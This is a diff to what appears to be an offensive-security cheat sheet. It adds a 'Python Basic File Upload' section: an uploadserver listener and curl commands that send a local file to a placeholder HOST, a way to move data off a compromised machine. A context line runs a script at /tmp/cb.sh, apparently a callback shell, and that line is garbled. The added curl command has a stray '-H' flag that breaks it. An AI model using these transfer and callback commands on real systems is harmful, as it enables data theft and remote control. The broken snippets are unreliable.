@@ -316,6 +316,21 @@ except: continue
 if os.path.exists("/tmp/cb.sh"): os.system("chmod -oo /tmp/cb.sh") os. system ("/tmp/cb. sh")
 ```
 
+# Python Basic File Upload
+
+```python
+# Listen to files
+python3 -m pip install --user uploadserver
+python3 -m uploadserver
+# With basic auth: 
+# python3 -m uploadserver --basic-auth hello:world
+
+# Send a file
+curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
+# With basic auth:
+# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
+```
+
 # Hashcat 
 
 ```
